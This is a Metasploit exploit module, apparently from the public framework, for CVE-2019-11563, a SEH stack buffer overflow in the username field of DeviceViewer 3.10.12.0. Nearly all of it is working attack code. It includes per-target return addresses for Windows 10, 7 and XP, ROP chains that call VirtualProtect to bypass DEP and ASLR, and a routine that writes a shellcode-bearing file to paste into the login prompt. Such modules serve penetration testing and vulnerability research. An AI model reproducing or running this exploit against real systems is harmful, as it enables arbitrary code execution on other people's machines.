##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'Shenzhen Sricctv Technology DeviceViewer User Field Stack Buffer Overlow',
      'Description'  => %q{
        This exploits a SEH stack buffer overflow in DeviceViewer v.3.10.12.0 present in the
        username login field. In the "User" login field paste the content of the generated
        exploit and press "Login". This module will bypass DEP and ASLR.
        It was successfully tested on Windows 10, Windows 7 and Windows XP SP3.
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'Hayden Wright',  # Original discovery
          'Paolo Stagno',  # @Void_Sec
        ],
      'References'  =>
        [
          [ 'CVE', '2019-11563' ],
          [ 'EDB', '46779' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'seh',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'Space' => 3728,
          'BadChars' => "\x00\x0a\x0d",
          'DisableNops' => true,
          #'StackAdjustment' => -1500
        },

      'Targets'    =>
        [
          [ 'DeviceViewer v.3.10.12.0 - Windows 10 (DEP + ASLR Bypass)', # Windows 10 Pro x64 v.1909 Build 18363.720(Windows enforce ASLR and DEP automatically on default configuration)
            {
              'Ret'     =>  0x6ad795e9, # 0x6ad795e9 : {pivot 3324 / 0xcfc} :  # ADD ESP,0CEC # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [avcodec-52.dll] **   |   {PAGE_EXECUTE_WRITECOPY}
              'Offset'  =>  264
            }
          ],
          [ 'DeviceViewer v.3.10.12.0 - Windows 7 (DEP + ASLR Bypass)', # Windows 7 Pro x86 v.6.1.7601 SP 1 Build 7601(Windows enforce ASLR and DEP automatically on default configuration)
            {
              'Ret'     =>  0x6a23c5ee, # 0x6a23c5ee : {pivot 3308 / 0xcec} :  # MOV EAX,18 # ADD ESP,0CDC # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [avcodec-54.dll] **   |   {PAGE_EXECUTE_READ}
              'Offset'  =>  264
            }
          ],
          [ 'DeviceViewer v.3.10.12.0 - Windows XP x86 SEH', # Windows XP Pro x86 v.5.1.2600 SP 3 Build 2600
            {
              'Ret' => 0x69901d06, #POP ESI, POP EDI, RET  avformat-54.dll
              'Offset' => 264
            }
          ],
        ],
      'Privileged'  => false,
      'DisclosureDate'  => 'Apr 10 2019',
      'DefaultTarget'  => 0))

    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'DeviceViewer_v.3.10.12.0_exploit.txt'])])

  end

  def create_rop_chain7()
    ## rop chain generated with mona.py - www.corelan.be, fixed by VoidSec
    # Register setup for VirtualProtect() :
    # EAX = NOP (0x90909090)
    # ECX = lpOldProtect (ptr to W address)
    # EDX = NewProtect (0x40)
    # EBX = dwSize
    # ESP = lPAddress (automatic)
    # EBP = ReturnTo (ptr to jmp esp)
    # ESI = ptr to VirtualProtect()
    # EDI = ROP NOP (RETN)
    ##
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x6a59babd,  # POP EAX # RETN [avcodec-54.dll]
      0x6ad38304,  # ptr to &VirtualProtect() [IAT avcodec-54.dll]
      0x69984f93,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [avformat-54.dll]
      0x6a544819,  # XCHG EAX,ESI # RETN [avcodec-54.dll]
      #[---INFO:gadgets_to_set_ebp:---]
      0x6991aea2,  # POP EBP # RETN [avformat-54.dll]
      0x6a1215c3,  # & push esp # ret  [avcodec-54.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x6a569810,  # POP EDX # RETN [avcodec-54.dll]
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x6a5d3987,  # NEG EDX # RETN [avcodec-54.dll]
      0x6a341293,  # PUSH EDX # MOV DWORD PTR DS:[EAX+EDX],ECX # POP EBX # RETN [avcodec-54.dll]
      #[---INFO:gadgets_to_set_edx:---]
      0x6a569810,  # POP EDX # RETN [avcodec-54.dll]
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x6a5d3732,  # NEG EDX # RETN [avcodec-54.dll]
      #[---INFO:gadgets_to_set_ecx:---]
      0x6a5fb07c,  # POP ECX # RETN [avcodec-54.dll]
      0x68ba656d,  # &Writable location [avutil-51.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x68b824ed,  # POP EDI # RETN [avutil-51.dll]
      0x6a2420ea,  # RETN (ROP NOP) [avcodec-54.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x6a0f2594,  # POP EAX # RETN [avcodec-54.dll]
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x6a5eb992,  # PUSHAD # RETN [avcodec-54.dll]
    ].flatten.pack("V*")

    return rop_gadgets

  end

  def create_rop_chain10()
    ## rop chain generated with mona.py - www.corelan.be, fixed by VoidSec
    # Register setup for VirtualProtect() :
    # EAX = NOP (0x90909090)
    # ECX = lpOldProtect (ptr to W address)
    # EDX = NewProtect (0x40)
    # EBX = dwSize
    # ESP = lPAddress (automatic)
    # EBP = ReturnTo (ptr to jmp esp)
    # ESI = ptr to VirtualProtect()
    # EDI = ROP NOP (RETN)
    ##
    rop_gadgets = [
      #[---INFO:gadgets_to_set_edx:---]
      0x6b050b5e,  # POP EAX # RETN [avcodec-52.dll]
      0xffffffd7,  # put delta into eax (-> put 0x00000040 into edx)
      0x6ad62214,  # ADD EAX,69 # RETN [avcodec-52.dll]
      0x6994f1d6,  # XCHG EAX,EDX # RETN [avformat-54.dll]
      #[---INFO:gadgets_to_set_esi:---]
      0x6b050b5e,  # POP EAX # RETN [avcodec-52.dll]
      0x68bab1f4,  # ptr to &VirtualProtect() [IAT avutil-51.dll]
      0x699150dc,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [avformat-54.dll]
      0x6ae8bcd8,  # XCHG EAX,ESI # RETN [avcodec-52.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x6b05be37,  # POP EAX # RETN [avcodec-52.dll]
      0xa1a50201,  # put delta into eax (-> put 0x00000201 into ebx)
      0x6ade3410,  # ADD EAX,5E5B0000 # POP EDI # POP EBP # RETN [avcodec-52.dll]
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x6ad5b2b4,  # PUSH EAX # POP EBX # RETN [avcodec-52.dll]
      #[---INFO:gadgets_to_set_ebp:---]
      0x6aec5b60,  # POP EBP # RETN [avcodec-52.dll]
      0x6ae590cf,  # & push esp # ret  [avcodec-52.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x699b8706,  # POP EDI # RETN [avformat-54.dll]
      0x6991e152,  # RETN (ROP NOP) [avformat-54.dll]
      #[---INFO:gadgets_to_set_ecx:---]
      0x699cc348,  # POP ECX # RETN [avformat-54.dll]
      0x6b68c50c,  # &Writable location [avcodec-52.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x6b05be46,  # POP EAX # RETN [avcodec-52.dll]
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x699047dc,  # PUSHAD # RETN [avformat-54.dll]
    ].flatten.pack("V*")
    return rop_gadgets

  end

  def exploit
    max_buff_length = 4000
    buffer = ""
    stack_adj = "\x81\xc4\x24\xfa\xff\xff" # stack adj; add esp, -1500

    if target.ret == 0x6ad795e9
      # win 10, add rop and different layout
      # |                                                     buffer (4000)                                                              |
      # | garbage (254) | nSEH (4) | SEH (4) | filler (384) | rop chain (92) | stack adj (6) | shellcode (371) | filler (4000-len(buff)) |
      buffer << make_nops(target['Offset']) # garbage
      buffer << make_nops(4) # nSEH
      buffer << [target.ret].pack("V") # SEH
      buffer << make_nops(384) # filler
      buffer << create_rop_chain10() # ROP
      buffer << stack_adj
      buffer << payload.encoded # shellcode
      buffer << make_nops(max_buff_length-buffer.length) # filler
    elsif target.ret == 0x6a23c5ee
      # win 7, add rop and different layout
      # |                                                     buffer (4000)                                                              |
      # | garbage (254) | nSEH (4) | SEH (4) | filler (456) | rop chain (92) | stack adj (6) | shellcode (371) | filler (4000-len(buff)) |
      buffer << make_nops(target['Offset']) # garbage
      buffer << make_nops(4) # nSEH
      buffer << [target.ret].pack("V") # SEH
      buffer << make_nops(456) # filler
      buffer << create_rop_chain7() # ROP
      buffer << stack_adj
      buffer << payload.encoded # shellcode
      buffer << make_nops(max_buff_length-buffer.length) # filler
    else
      # win xp, plain SEH exploit
      buffer << make_nops(target['Offset'])
      buffer << generate_seh_payload(target.ret)
      buffer << make_nops(max_buff_length-buffer.length)

    end
    #debug message
    print_status("Trying target #{target.name}...")
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create(buffer)

  end
end
